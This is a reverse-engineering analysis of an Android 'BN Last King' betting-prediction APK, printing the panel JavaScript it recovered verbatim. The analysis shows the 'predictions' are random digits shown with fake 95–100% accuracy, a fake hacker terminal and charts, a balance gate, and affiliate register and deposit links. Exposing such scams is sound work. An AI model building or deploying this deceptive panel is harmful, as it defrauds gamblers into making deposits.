/***
 * BN LAST KING RAJA GAME -- CORE LOGIC + PREDICTION LOGIC (verbatim recovery)
 *
 * source apk  : logic/src/bnking.apk
 * apk size    : 8708876 bytes
 * apk sha256  : 86aaa254877d14d1e011cb73ccc2d5f5c86d07e9b98be4cccf55b7a57889beff
 * package     : com.penal.server  ("BN LAST KING RAJA GAME")
 * regenerated : python3 logic/bnking_extract.py  (idempotent: same bytes every run)
 *
 * WHERE THE LOGIC LIVES
 *   All of the app's own code is in classes62.dex -- every other dex in the archive is library
 *   code. The VIP panel is NOT an asset file: the entire HUD (markup, CSS and all
 *   JavaScript) is one 51241-character HTML string assembled at runtime by
 *   com.penal.server.MainActivity.c() (.method private c()V, smali lines 149-3665).
 *   The prediction, the state machine and the whole native-bridge contract live inside
 *   that string. Only the HUD loader, the WebView/bridge wiring, the guard chain and the
 *   game-page hooks exist as real Dalvik -- they are the final section.
 *
 * HOW THE STRINGBUILDER REPLAY WAS UNDONE
 *   c() allocates one java.lang.StringBuilder (smali line 416) and feeds it 412 init/append
 *   slots, 411 of them supplied by an encrypted const-string carrier (largest carrier
 *   decodes to 31904 characters), before StringBuilder.toString() at line 3560 is handed to
 *   WebView.loadDataWithBaseURL("file:///android_res/drawable/", html, "text/html",
 *   "UTF-8", null) on an overlay WebView that is addView()d onto the activity's root
 *   FrameLayout as an 85dp pill at topMargin 400 / leftMargin 50.
 *   Each carrier is a StringFog literal consumed by Lb/a;->decrypt(s), which is
 *   Base64.decode(s, NO_WRAP) -> XOR every byte against key.charAt(i % key.length()) ->
 *   new String(bytes, "UTF-8"), and the key passed in is the class's own
 *   CHARSET_NAME_UTF_8 literal, i.e. the three characters "UTF-8". So the blob is the
 *   const-string and the key is a constant, no per-class table.
 *   Recovery is a one-pass abstract interpretation of c() from the builder allocation to
 *   toString(): const-string -> decrypt -> move-result-object -> move-object copies are
 *   tracked per register and each append is recorded together with the carrier LINE that
 *   fed it. That distinction matters: 16 carriers are pre-loaded into v7..v22 at the top
 *   of the method and appended much later, so append order and line order differ, and a
 *   naive "concatenate every const-string in line order" extractor shuffles the HTML.
 *   One slot is not a string at all: minReqValue's 300.0 arrives as a const-wide pushed
 *   into a double[] (aput-wide), read back with aget-wide and appended via append(D), so
 *   the replay also evaluates double arrays and renders the value Java-style ("300.0").
 *   The recovered stream contains no LF, CR or TAB whatsoever -- it is one single line.
 *   Every section below is a byte-for-byte substring cut out of it with unique anchors;
 *   nothing is re-indented, re-wrapped, repaired or retyped, and the slices are asserted
 *   to concatenate back to the exact script body. The result is also asserted free of the
 *   injection markers ('bdgwin78.com', '4148715921265', 'String.fromCharCode') that identify the re-patched HUD of this family.
 *
 * WHAT THE "PREDICTION" ACTUALLY IS
 *   Nothing is predicted. computeResult() rolls a fresh client-side random digit with
 *   Math.floor(Math.random() * 10) for each 1-minute Wingo period, derives BIG/SMALL
 *   arithmetically from it (n >= 5 -> BIG), derives GREEN/RED from digit parity with a
 *   coin flip for the two half-winning digits 0 and 5, and prints a random "accuracy"
 *   between 95.0% and 100.0%. It never reads the game's real outcome -- the only datum
 *   that crosses from the betting site into the panel is the wallet balance scraped by
 *   t.run() and pushed in through route(). The candlestick charts, the NODES counter and
 *   the root@sys terminal are all pure Math.random() decoration, and the period number is
 *   computed from the wall clock, so the feed is RANDOM, not live.
 *   The commercial trick is V1/V2/V4: they do not use a better algorithm, they simply
 *   null out fields of the same random roll to make the panel look differently "bypassed".
 *
 * VALIDATION -- node --check on the extracted script body (logic/bn_dex/hud_script_original.js):
 *   PASS (exit 0, no SyntaxError)
 *   The whole HUD is minified onto one line, so a single stray quote in the original
 *   would be a fatal unterminated-string SyntaxError for the entire panel. This build
 *   parses cleanly; nothing has been changed to make it do so.
 ***/

// ==== section: recovered-html manifest
// file           : logic/bn_dex/hud_pristine.html (rewritten by this script)
// recovered html : 51241 chars / 51271 utf-8 bytes, 1 line, 0 CR / 0 LF / 0 TAB
// builder slots  : 412 total, 411 from a carrier const-string, 0 anomalies
// script body    : html chars[31882:51218] == 19336 chars, taken between the literal <script>
//                  and </script> tags; the JS sections below tile it with zero gaps
// sections       : 18

// ==== section: hud globals: min-balance threshold, state flags, timer handles
    var minReqValue = 300.0;    var balance = '0.00';    var state = 'waiting';    var isScanning = false;    var resultDisplayed = false;    var lastGeneratedPeriod = null;    var currentResultSz = 'BIG';    var currentNum = 0;    var currentColour = 'GREEN';    var currentAcc = '99.9';    var lowBalSpoken = false;    var scanInterval = null;    var termInterval = null;    var scanTimeout = null;    var currentTheme = 'yellow';    var currentBypass = 'v3';    var bypassPopOpen = false;    var colorPopOpen = false;    var autoThemeOn = false;    var autoThemeIdx = 0;    var autoThemeTimer = null;    var autoThemeList = ['yellow','red','green','sky','pink','grey','white','black'];    setInterval(function(){      var p = document.getElementById('period-display');      if(p) { p.innerText = getP(); }    }, 1000);    

// ==== section: live feed: the 1-minute wingo period clock (getP)
function getP(){      var d = new Date();      var utc = new Date(d.toLocaleString('en-US', {timeZone: 'UTC'}));      utc.setMinutes(utc.getMinutes() + 330);      return String(10001 + (utc.getUTCHours() * 60 + utc.getUTCMinutes())).slice(-3);    }    

// ==== section: display helpers: status text, balance, panel visibility
function updateStatusText(txt){      var el = document.getElementById('status-text');      if(el) el.innerText = txt;    }    function updateBalanceDisplay(){      var el = document.getElementById('balance-display');      if(el) el.innerText = balance;    }    function isMainOpen(){      var w = document.getElementById('main-wrapper');      return w && w.style.display === 'flex';    }    

// ==== section: openM: expand panel + TeamBridge.resizeView(0, 340, 400)
function openM(){      document.getElementById('main-wrapper').style.display = 'flex';      document.getElementById('main').style.display = 'flex';      document.getElementById('mini-wrapper').style.display = 'none';      if (typeof TeamBridge !== 'undefined' && typeof TeamBridge.resizeView === 'function') {        TeamBridge.resizeView(0, 340, 400);      }      updateStatusText(state === 'waiting' ? 'READY' : (state === 'result' ? 'RESULT' : 'ENGINE'));      updateBalanceDisplay();      render();    }    

// ==== section: closeM: collapse to the pill and kill every timer
function closeM(e){      if(e) { try { e.stopPropagation(); e.preventDefault(); } catch(_) {} }      try {        if(scanInterval) { clearInterval(scanInterval); scanInterval = null; }        if(termInterval) { clearInterval(termInterval); termInterval = null; }        if(scanTimeout) { clearTimeout(scanTimeout); scanTimeout = null; }        closeBypassPop();        closeColorPop();        var sp = document.getElementById('settings-panel');        var mo = document.getElementById('menu-overlay');        if(sp) sp.classList.remove('open');        if(mo) mo.classList.remove('open');        var mw = document.getElementById('main-wrapper');        var mn = document.getElementById('main');        var mi = document.getElementById('mini-wrapper');        if(mw) mw.style.display = 'none';        if(mn) mn.style.display = 'none';        if(mi) mi.style.display = 'flex';        if (typeof TeamBridge !== 'undefined' && typeof TeamBridge.resizeView === 'function') {          TeamBridge.resizeView(0, 90, 90);        }      } catch(err) {}    }

// ==== section: hide-pill triple binding (click / touchend / pointerup)
    /* ===== HIDE BUTTON — TRIPLE BINDING ===== */    (function bindHide(){      var btn = document.getElementById('hide-pill');      if(!btn) return;      function fire(ev){        try { ev.stopPropagation(); ev.preventDefault(); } catch(_) {}        closeM(ev);      }      btn.addEventListener('click', fire, false);      btn.addEventListener('touchend', fire, { passive: false });      btn.addEventListener('pointerup', fire, false);    })();    

// ==== section: popovers: settings, bypass, colour + outside-tap dismiss
function toggleSettings(e){      if(e) { e.stopPropagation(); e.preventDefault(); }      closeBypassPop();      closeColorPop();      var panel = document.getElementById('settings-panel');      var overlay = document.getElementById('menu-overlay');      if(panel.classList.contains('open')) {        panel.classList.remove('open');        overlay.classList.remove('open');      } else {        panel.classList.add('open');        overlay.classList.add('open');      }    }    function toggleBypassPop(e){      if(e) { e.stopPropagation(); e.preventDefault(); }      var wasOpen = bypassPopOpen;      closeColorPop();      var pop = document.getElementById('bypass-pop');      var chip = document.getElementById('bypass-chip');      bypassPopOpen = !wasOpen;      if(bypassPopOpen) { pop.classList.add('open'); chip.classList.add('open'); }      else { pop.classList.remove('open'); chip.classList.remove('open'); }    }    function closeBypassPop(){      if(!bypassPopOpen) return;      bypassPopOpen = false;      var pop = document.getElementById('bypass-pop');      var chip = document.getElementById('bypass-chip');      if(pop) pop.classList.remove('open');      if(chip) chip.classList.remove('open');    }    function toggleColorPop(e){      if(e) { e.stopPropagation(); e.preventDefault(); }      var wasOpen = colorPopOpen;      closeBypassPop();      var pop = document.getElementById('color-pop');      var light = document.getElementById('color-light');      colorPopOpen = !wasOpen;      if(colorPopOpen) { pop.classList.add('open'); light.classList.add('open'); }      else { pop.classList.remove('open'); light.classList.remove('open'); }    }    function closeColorPop(){      if(!colorPopOpen) return;      colorPopOpen = false;      var pop = document.getElementById('color-pop');      var light = document.getElementById('color-light');      if(pop) pop.classList.remove('open');      if(light) light.classList.remove('open');    }    document.addEventListener('touchstart', function(e){      if(bypassPopOpen) {        var pop = document.getElementById('bypass-pop');        var chip = document.getElementById('bypass-chip');        if(pop && chip && !pop.contains(e.target) && !chip.contains(e.target)) closeBypassPop();      }      if(colorPopOpen) {        var cpop = document.getElementById('color-pop');        var clight = document.getElementById('color-light');        if(cpop && clight && !cpop.contains(e.target) && !clight.contains(e.target)) closeColorPop();      }    }, { passive: true });    document.addEventListener('click', function(e){      if(bypassPopOpen) {        var pop = document.getElementById('bypass-pop');        var chip = document.getElementById('bypass-chip');        if(pop && chip && !pop.contains(e.target) && !chip.contains(e.target)) closeBypassPop();      }      if(colorPopOpen) {        var cpop = document.getElementById('color-pop');        var clight = document.getElementById('color-light');        if(cpop && clight && !cpop.contains(e.target) && !clight.contains(e.target)) closeColorPop();      }    });    

// ==== section: theme engine: 8 palettes and the AUTO rotation
function setTheme(t, e){      if(e) { e.stopPropagation(); e.preventDefault(); }      if(t === 'auto') {        autoThemeOn = true;        if(autoThemeTimer) clearInterval(autoThemeTimer);        autoThemeIdx = 0;        applyTheme(autoThemeList[0]);        autoThemeTimer = setInterval(function(){          autoThemeIdx = (autoThemeIdx + 1) % autoThemeList.length;          applyTheme(autoThemeList[autoThemeIdx]);          if(isMainOpen()) render();        }, 6000);        currentTheme = 'auto';      } else {        autoThemeOn = false;        if(autoThemeTimer) { clearInterval(autoThemeTimer); autoThemeTimer = null; }        currentTheme = t;        applyTheme(t);      }      document.querySelectorAll('.color-swatch').forEach(function(d){ d.classList.remove('selected'); });      var target = document.getElementById('sw-' + t);      if(target) target.classList.add('selected');      var cur = document.getElementById('color-current');      if(cur) cur.innerText = (t === 'auto') ? 'AUTO' : t.toUpperCase();      closeColorPop();      if(isMainOpen()) render();    }    function applyTheme(t){      document.body.className = 'theme-' + t;      var cur = document.getElementById('color-current');      if(cur && autoThemeOn) cur.innerText = 'AUTO · ' + t.toUpperCase();    }    

// ==== section: setBypass: V1/V2/V3/V4 selector, re-renders a shown result
function setBypass(v, e){      if(e) { e.stopPropagation(); e.preventDefault(); }      currentBypass = v;      document.querySelectorAll('.bypass-opt').forEach(function(o){ o.classList.remove('selected'); });      var target = document.getElementById('bypass-' + v);      if(target) target.classList.add('selected');      var label = document.getElementById('bypass-chip-label');      if(label) label.innerText = v.toUpperCase();      closeBypassPop();      if(state === 'result') { computeResult(); render(); }    }    

// ==== section: PREDICTION CORE: computeResult() number / size / colour / accuracy
function computeResult(){      var n = Math.floor(Math.random() * 10);      currentNum = n;      currentResultSz = (n >= 5) ? 'BIG' : 'SMALL';      if (n === 0 || n === 5) { currentColour = (Math.random() > 0.5) ? 'GREEN' : 'RED'; }      else if (n % 2 === 1) { currentColour = 'GREEN'; }      else { currentColour = 'RED'; }      currentAcc = (Math.random() * (100.0 - 95.0) + 95.0).toFixed(1);      if(currentBypass === 'v1') { currentNum = null; currentColour = null; }      else if(currentBypass === 'v2') { currentNum = null; }      else if(currentBypass === 'v4') { currentNum = null; currentResultSz = null; }    }    

// ==== section: random candlestick chart generator (the fake market feed)
function makeChart(containerId, count, upBias){      var wrap = document.getElementById(containerId);      if(!wrap) return;      var inner = '';      var candles = '';      var maPoints = '';      var wickSum = 0;      var base = 32;      var trend = (Math.random() - 0.5) * 0.7;      var prices = [];      for(var i=0; i<count; i++){        var isUp = Math.random() > (1 - upBias);        var bodyH = 4 + Math.random()*14;        var wickH = bodyH + 4 + Math.random()*10;        wickSum += wickH;        base = base + trend + (Math.random() - 0.5) * 3;        if(base < 8) base = 8 + Math.random()*4;        if(base > 46) base = 46 - Math.random()*4;        prices.push(base);        var delay = (i*0.04).toFixed(2);        candles += '<div class="candle-group" style="animation-delay:' + delay + 's;">' +          '<div class="candle-wick" style="height:' + wickH + 'px;"></div>' +          '<div class="candle-body ' + (isUp ? 'candle-up' : 'candle-down') + '" style="height:' + bodyH + 'px;"></div>' +          '<div class="candle-wick" style="height:' + (wickH*0.4) + 'px;"></div>' +        '</div>';      }      var avg = 0;      for(var p=0; p<5; p++) avg += prices[p] || 0;      avg = avg / Math.min(5, prices.length);      var maTop = 100 - (avg / 54) * 100;      maPoints = 'M 0 ' + maTop + ' L 100 ' + (maTop + (Math.random()-0.5)*10);      var volPct = Math.min(99, Math.max(20, Math.round(wickSum / count * 3)));      var priceTxt = (wickSum / count).toFixed(1);      inner = '<div class="chart-grid"></div>' +        '<div class="chart-candles">' + candles + '</div>' +        '<div class="chart-ma"><svg viewBox="0 0 100 100" preserveAspectRatio="none"><path d="' + maPoints + '" stroke="#FFA726" stroke-width="1" stroke-dasharray="2,2" fill="none" opacity="0.7"/></svg></div>' +        '<div class="chart-price-tag">P ' + priceTxt + '</div>' +        '<div class="chart-vol-tag">V ' + volPct + '%</div>' +        '<div class="chart-axis"><span>100</span><span>75</span><span>50</span><span>25</span><span>0</span></div>';      wrap.innerHTML = inner;    }    function buildScanChart(){ makeChart('scan-chart', 18, 0.55); }    function buildResultChart(){ makeChart('result-chart', 20, 0.6); }    

// ==== section: fake root@sys terminal line spawner
function addTerminalLine(){      var lines = document.getElementById('terminal-lines');      if(!lines) return;      var cmds = ['inject','scan','bypass','decode','probe','hack','trace'];      var line = document.createElement('div');      line.className = 'terminal-line';      line.innerHTML = '<span style="color:#fff">root@sys:~$</span> <span class="cmd">'+cmds[Math.floor(Math.random()*cmds.length)]+'</span> <span class="val">[OK]</span>';      lines.appendChild(line);      if(lines.children.length > 6) lines.removeChild(lines.firstChild);    }    

// ==== section: doScan / startHack: the scan cycle, 4000ms lock, once per period
function doScan(){      var currentLivePeriod = getP();      if(lastGeneratedPeriod === currentLivePeriod && resultDisplayed) {        if(typeof TeamBridge !== 'undefined' && typeof TeamBridge.speak === 'function') TeamBridge.speak('pleasewait');        return;      }      if(state === 'scanning') return;      lastGeneratedPeriod = currentLivePeriod;      state = 'scanning';      isScanning = true;      updateStatusText('SCANNING');      computeResult();      render();      scanTimeout = setTimeout(function() {        state = 'result';        isScanning = false;        resultDisplayed = true;        updateStatusText('RESULT');        if(scanInterval) { clearInterval(scanInterval); scanInterval = null; }        if(termInterval) { clearInterval(termInterval); termInterval = null; }        scanTimeout = null;        render();      }, 4000);    }    function startHack(){ doScan(); }    

// ==== section: changeResult: drop the once-per-period lock and re-roll
function changeResult(){      lastGeneratedPeriod = null;      resultDisplayed = false;      state = 'wingo';      doScan();    }    

// ==== section: doDeposit: bridge hop to the recharge page
function doDeposit(){      if(typeof TeamBridge !== 'undefined' && typeof TeamBridge.goToDeposit === 'function') TeamBridge.goToDeposit();    }    

// ==== section: GUARD/ROUTE STATE MACHINE: route(state, balance), pushed in from Java
function route(r, bal){      balance = (bal == null) ? '0.00' : String(bal);      updateBalanceDisplay();      if(state === 'scanning') return;      if(state === 'result' && r === 'wingo') return;      state = r;      if(r === 'waiting') updateStatusText('READY');      else if(r === 'wingo') updateStatusText('ENGINE');      else if(r === 'reg') updateStatusText('AUTH');      if(isMainOpen()) render();    }    

// ==== section: render: per-state HUD templates (register URL + min-balance gate)
function render(){      var cont = document.getElementById('content');      var btn = document.getElementById('btn-area');      if(!cont || !btn) return;      var cleanBal = parseFloat(String(balance).replace(/[^0-9.-]+/g,''));      updateBalanceDisplay();      if(state == 'reg'){        cont.innerHTML='<div class="info-headline">AUTH REQUIRED</div><div class="info-list"><div class="info-item">1. Login Detected</div><div class="info-item">2. Fresh Account Req.</div><div class="info-item">3. Go To Wingo Page</div></div>';        btn.innerHTML='<button class="nb-btn btn-action" onclick="TeamBridge.loadUrl(\'https://www.raja8899.net/#/register?invitationCode=822783704787\')">LOGIN NOW</button>';      } else if(state == 'waiting'){        cont.innerHTML='<div class="info-headline">SYSTEM ACTIVE</div><div class="info-list"><div class="info-item">1. Page Supported</div><div class="info-item">2. Go To Wingo 1Min</div><div class="info-item">3. Req. Bal ' + minReqValue + '</div></div>';        btn.innerHTML='<button class="nb-btn btn-action" onclick="actionClick()">DEPOSIT</button>';      } else if(state == 'scanning'){        if(scanInterval) clearInterval(scanInterval);        if(termInterval) clearInterval(termInterval);        cont.innerHTML = '<div class="hacker-scan-container">' +          '<div class="scan-line"></div>' +          '<div class="hacker-title">[ SCANNING SYSTEM ]</div>' +          '<div class="terminal-lines" id="terminal-lines"></div>' +          '<div class="trading-chart-wrap" id="scan-chart" style="border-color:#00E676;"></div>' +          '<div class="progress-track"><div class="progress-fill"></div></div>' +          '<div class="hacker-stats"><span>BYPASSING...</span><span id="stat-nodes">NODES: 0</span></div>' +        '</div>';        btn.innerHTML = '<button class="nb-btn btn-action btn-scanning">SCANNING...</button>';        buildScanChart();        for(var i=0; i<4; i++) addTerminalLine();        termInterval = setInterval(function(){          addTerminalLine();          var sn = document.getElementById('stat-nodes');          if(sn) sn.innerText = 'NODES: '+(20+Math.floor(Math.random()*80));        }, 400);        scanInterval = setInterval(function(){ buildScanChart(); }, 900);      } else if(state == 'wingo' || state == 'result'){        if(isNaN(cleanBal) || cleanBal < minReqValue){          if(!lowBalSpoken && typeof TeamBridge !== 'undefined' && typeof TeamBridge.speak === 'function') {            TeamBridge.speak('Low balance, please deposit!');            lowBalSpoken = true;          }          cont.innerHTML = '<div class="info-headline" style="color:#FF3366;">LOW FUNDS</div><div class="info-list"><div class="info-item">1. Wingo Detected</div><div class="info-item">2. Bal: <span class="theme-text">₹ ' + balance + '</span></div><div class="info-item">3. Req: ' + minReqValue + '</div></div>';          btn.innerHTML = '<button class="nb-btn btn-action" style="background:#FF3366;color:#fff;" onclick="doDeposit()">DEPOSIT</button>';          resultDisplayed = false;        } else {          lowBalSpoken = false;          if(!resultDisplayed) {            cont.innerHTML = '<div class="info-headline">ENGINE READY</div><div class="info-list"><div class="info-item">Balance: <span class="theme-text">₹ ' + balance + '</span></div></div>';            btn.innerHTML = '<button class="nb-btn btn-action" onclick="startHack()">START HACK</button>';          } else {            var html = '';            if(currentBypass === 'v1'){              var szClass = (currentResultSz === 'BIG') ? 'badge-big' : 'badge-small';              html += '<div class="result-row"><span class="result-badge ' + szClass + '" style="font-size:19px; padding:7px 14px;">' + currentResultSz + '</span></div>';            } else if(currentBypass === 'v2'){              var szClass2 = (currentResultSz === 'BIG') ? 'badge-big' : 'badge-small';              var colClass2 = (currentColour === 'GREEN') ? 'colour-green' : 'colour-red';              html += '<div class="result-row">' +                '<span class="result-badge ' + szClass2 + '">' + currentResultSz + '</span>' +                '<span class="result-colour ' + colClass2 + '">' + currentColour + '</span>' +              '</div>';            } else if(currentBypass === 'v3'){              var szClass3 = (currentResultSz === 'BIG') ? 'badge-big' : 'badge-small';              var colClass3 = (currentColour === 'GREEN') ? 'colour-green' : 'colour-red';              html += '<div class="result-row">' +                '<span class="result-badge ' + szClass3 + '">' + currentResultSz + '</span>' +                '<span class="result-number">' + currentNum + '</span>' +                '<span class="result-colour ' + colClass3 + '">' + currentColour + '</span>' +              '</div>';            } else if(currentBypass === 'v4'){              var colClass4 = (currentColour === 'GREEN') ? 'colour-green' : 'colour-red';              html += '<div class="result-row"><span class="result-colour ' + colClass4 + '" style="font-size:19px; padding:7px 18px;">' + currentColour + '</span></div>';            }            html += '<div class="trading-chart-wrap" id="result-chart"></div>' +              '<div class="new-confirmed-box">CONF(' + currentAcc + '%)</div>';            cont.innerHTML = html;            btn.innerHTML = '<button class="nb-btn btn-action" onclick="changeResult()">CHECK NEXT</button>';            buildResultChart();          }        }      }    }    

// ==== section: boot: window.onload and the window.actionClick export
window.onload = function() {      document.getElementById('main-wrapper').style.display = 'none';      document.getElementById('mini-wrapper').style.display = 'flex';      updateBalanceDisplay();      if (typeof TeamBridge !== 'undefined' && typeof TeamBridge.resizeView === 'function') {        TeamBridge.resizeView(0, 90, 90);      }    };    window.actionClick = function(){      if(typeof TeamBridge !== 'undefined' && typeof TeamBridge.goToDeposit === 'function') TeamBridge.goToDeposit();    };  

// ==== section: native bridge contract, as the HUD actually uses it
// The Java object is published as the window global "TeamBridge" by
//   MainActivity.c():  hudWebView.addJavascriptInterface(bridgeInstance, decrypt("ATEnQHonPSJKXQ=="))
// the interface NAME is itself StringFog-wrapped; it decodes to: TeamBridge
// bridge instance class = com.penal.server.i (constructor signature
//   (MainActivity, k tts-wrapper, String[] registerUrls, WebView[] hudWebViews, String[] depositUrls))
// every JS call site is guarded by  typeof TeamBridge !== 'undefined' &&
//   typeof TeamBridge.<m> === 'function'  -- the panel degrades silently if the
//   overlay was rebuilt without the interface. Methods the HUD uses: 4 of the 7 (goToDeposit, loadUrl, resizeView, speak).
// Verbatim call sites, in source order (owner = enclosing JS function):

//   [openM]  TeamBridge.resizeView(0, 340, 400)
//   [closeM]  TeamBridge.resizeView(0, 90, 90)
//   [doScan]  TeamBridge.speak('pleasewait')
//   [doDeposit]  TeamBridge.goToDeposit()
//   [render]  TeamBridge.loadUrl(\'https://www.raja8899.net/#/register?invitationCode=822783704787\')
//   [render]  TeamBridge.speak('Low balance, please deposit!')
//   [window.onload]  TeamBridge.resizeView(0, 90, 90)
//   [window.actionClick]  TeamBridge.goToDeposit()

// URL / token literals the bridge is asked to load, recovered from the decoded
// String[] constants c() builds (these exact bytes):
//   register array [0] = https://www.raja8899.net/#/register?invitationCode=822783704787
//   deposit  array [0] = https://rajaactivity.com/#/wallet/Recharge,
//   note the deposit literal really does end in a trailing comma in the original, and
//   invitationCode=822783704787 is the ORIGINAL affiliate code shipped by this apk; the
//   re-patched build of this family swaps a different one in, and that code is
//   asserted ABSENT from the recovered html at the top of this run.
//   the register hop is not a JS statement: render() writes it into an inline
//   onclick="..." attribute of the LOGIN NOW button, so the page itself executes
//   TeamBridge.loadUrl(<url>) when the user taps. goToDeposit()/goToRegister() take no
//   argument -- the target is index 0 of the native String[] captured at bridge
//   construction, so the JS cannot see or change the affiliate URL.

// ==== section: timers and storage keys
// JS timer call sites, verbatim substrings of the script body:
//   setInterval(function(){      var p = document.getElementById('period-display')
//   clearInterval(scanInterval)
//   clearInterval(termInterval)
//   clearTimeout(scanTimeout)
//   clearInterval(autoThemeTimer)
//   setInterval(function(){          autoThemeIdx = (autoThemeIdx + 1) % autoThemeList.length
//   clearInterval(autoThemeTimer)
//   setTimeout(function() {        state = 'result'
//   clearInterval(scanInterval)
//   clearInterval(termInterval)
//   clearInterval(scanInterval)
//   clearInterval(termInterval)
//   setInterval(function(){          addTerminalLine()
//   setInterval(function(){ buildScanChart()
// periods: 1000ms period-clock repaint | 6000ms AUTO theme rotation | 4000ms scan lock
//   (setTimeout that flips state 'scanning' -> 'result') | 400ms terminal line spawner
//   | 900ms scan-chart rebuild | 500ms native guard poll (Java Timer, see below).
//   closeM() clears scanInterval, termInterval and scanTimeout; setTheme('auto') owns
//   autoThemeTimer, which nothing else clears.
// Storage: the HUD touches NO web storage -- "localStorage", "sessionStorage",
//   "getItem" and "setItem" each occur 0 times in the recovered html.
//   Persistence is native-only: MainActivity.b() opens
//   getSharedPreferences(b/a.decrypt("NCEyRQ=="), MODE_PRIVATE), which decodes to the
//   file name "auth", and caches it in field f -- but no get/put on it exists anywhere
//   in com.penal.server, so the key is an unused handle.
//   The only real cross-tick state is the 1-element String[] route latch inside the
//   guard (fields b of t/u), primed to "waiting" and rewritten only on a page change.
//   The two String[] affiliate URLs and the double[]{300.0} min-balance are constants
//   rebuilt every launch.

// ==== section: hud dom scaffold (the entry points render() binds to)
// Verbatim <body> markup, 5919 chars. ids the logic queries: balance-display, btn-area, bypass-chip, bypass-chip-label, bypass-count, bypass-pop, bypass-v1, bypass-v2, bypass-v3, bypass-v4, color-current, color-light, color-pop, content, hide-pill, main, main-wrapper, menu-overlay, mini, mini-wrapper, period-display, settings-panel, status-text, sw-auto, sw-black, sw-green, sw-grey, sw-pink, sw-red, sw-sky, sw-white, sw-yellow
// Inline entry points (verbatim): onclick='closeM(event)'; onclick='openM()'; onclick='setBypass("v1", event)'; onclick='setBypass("v2", event)'; onclick='setBypass("v3", event)'; onclick='setBypass("v4", event)'; onclick='setTheme("auto", event)'; onclick='setTheme("black", event)'; onclick='setTheme("green", event)'; onclick='setTheme("grey", event)'; onclick='setTheme("pink", event)'; onclick='setTheme("red", event)'; onclick='setTheme("sky", event)'; onclick='setTheme("white", event)'; onclick='setTheme("yellow", event)'; onclick='toggleBypassPop(event)'; onclick='toggleColorPop(event)'; onclick='toggleSettings(event)'
// The mini pill is what resizeView(0,90,90) / resizeView(0,340,400) are sized against;
// <img src='logo.png'> resolves against the loadDataWithBaseURL origin
// file:///android_res/drawable/, i.e. the APK's own drawable resources.
// (payload follows verbatim after the line-comment marker; it is a single line)
// <body class='theme-yellow'>  <div id='mini-wrapper'>    <div id='mini' onclick='openM()'>      <img src='logo.png' style='width: 100%; height: 100%; object-fit: cover; border-radius: 14px; pointer-events: none;' onerror="this.style.display='none'; this.nextElementSibling.style.display='block';" />      <div class='mini-logo' style='display:none; font-family: Space Grotesk, sans-serif; font-weight: 900; font-size: 28px; color: #fff; pointer-events: none; text-shadow: 1px 1px 0 rgba(0,0,0,0.4);'>&#9889;</div>    </div>  </div>  <div id='main-wrapper' style='display:none;'>    <div id='main'>      <div class='header'>        <div class='header-title'>BN LAST KING SERVER</div>        <div class='header-actions'>          <div class='color-light' id='color-light' onclick='toggleColorPop(event)'></div>          <div class='bypass-chip' id='bypass-chip' onclick='toggleBypassPop(event)'>            <div class='bypass-dual'></div>            <div class='bypass-chip-label' id='bypass-chip-label'>V3</div>            <div class='bypass-chip-caret'>&#9660;</div>          </div>          <button class='hide-pill' id='hide-pill' onclick='closeM(event)' type='button'>            <div class='hide-pill-badge'>&#10005;</div>            <div class='hide-pill-label'>HIDE</div>          </button>          <div class='header-icon-btn' onclick='toggleSettings(event)'>&#9776;</div>        </div>      </div>      <div class='status-strip'>        <div class='live-badge'><span class='live-dot'></span> LIVE</div>        <div class='status-text' id='status-text'>READY</div>        <div class='id-pill'>ID<span id='period-display'>...</span></div>        <div class='balance-pill'>₹<span id='balance-display'>0.00</span></div>      </div>      <div class='bypass-pop' id='bypass-pop'>        <div class='bypass-pop-title'><span>BYPASS MODE</span><span id='bypass-count'>15</span></div>        <div class='bypass-opt' onclick='setBypass("v1", event)' id='bypass-v1'>          <div class='bypass-opt-icon'>&#9650;</div>          <div class='bypass-opt-info'><div class='bypass-opt-name'>V1 — Big / Small</div><div class='bypass-opt-desc'>Size only · Fast</div></div>        </div>        <div class='bypass-opt' onclick='setBypass("v2", event)' id='bypass-v2'>          <div class='bypass-opt-icon'>&#9670;</div>          <div class='bypass-opt-info'><div class='bypass-opt-name'>V2 — Size / Colour</div><div class='bypass-opt-desc'>Big, Small, Red, Green</div></div>        </div>        <div class='bypass-opt selected' onclick='setBypass("v3", event)' id='bypass-v3'>          <div class='bypass-opt-icon'>&#9733;</div>          <div class='bypass-opt-info'><div class='bypass-opt-name'>V3 — Full Result</div><div class='bypass-opt-desc'>Size + Colour + Number</div></div>        </div>        <div class='bypass-opt' onclick='setBypass("v4", event)' id='bypass-v4'>          <div class='bypass-opt-icon'>&#9679;</div>          <div class='bypass-opt-info'><div class='bypass-opt-name'>V4 — Colour Only</div><div class='bypass-opt-desc'>Red / Green · Minimal</div></div>        </div>      </div>      <div class='color-pop' id='color-pop'>        <div class='color-pop-title'><span>COLOR THEME</span><span id='color-current'>YELLOW</span></div>        <div class='color-grid'>          <div class='color-swatch' onclick='setTheme("red", event)' id='sw-red'><div class='color-swatch-dot sw-red'></div><div class='color-swatch-label'>Red</div></div>          <div class='color-swatch' onclick='setTheme("green", event)' id='sw-green'><div class='color-swatch-dot sw-green'></div><div class='color-swatch-label'>Green</div></div>          <div class='color-swatch' onclick='setTheme("white", event)' id='sw-white'><div class='color-swatch-dot sw-white'></div><div class='color-swatch-label'>White</div></div>          <div class='color-swatch selected' onclick='setTheme("yellow", event)' id='sw-yellow'><div class='color-swatch-dot sw-yellow'></div><div class='color-swatch-label'>Yellow</div></div>          <div class='color-swatch' onclick='setTheme("black", event)' id='sw-black'><div class='color-swatch-dot sw-black'></div><div class='color-swatch-label'>Black</div></div>          <div class='color-swatch' onclick='setTheme("pink", event)' id='sw-pink'><div class='color-swatch-dot sw-pink'></div><div class='color-swatch-label'>Pink</div></div>          <div class='color-swatch' onclick='setTheme("grey", event)' id='sw-grey'><div class='color-swatch-dot sw-grey'></div><div class='color-swatch-label'>Grey</div></div>          <div class='color-swatch' onclick='setTheme("sky", event)' id='sw-sky'><div class='color-swatch-dot sw-sky'></div><div class='color-swatch-label'>Sky</div></div>          <div class='color-swatch' onclick='setTheme("auto", event)' id='sw-auto'><div class='color-swatch-dot sw-auto'></div><div class='color-swatch-label'>Auto</div></div>        </div>      </div>      <div id='content'></div>      <div id='btn-area'></div>      <div class='menu-overlay' id='menu-overlay' onclick='toggleSettings(event)'></div>      <div class='settings-panel' id='settings-panel'>        <div class='settings-header'>          <div class='settings-title'>SETTINGS</div>          <div class='settings-close' onclick='toggleSettings(event)'>&#10005;</div>        </div>        <div class='settings-scroll'>          <div class='settings-section'>            <div class='settings-label'>QUICK GUIDE</div>            <div 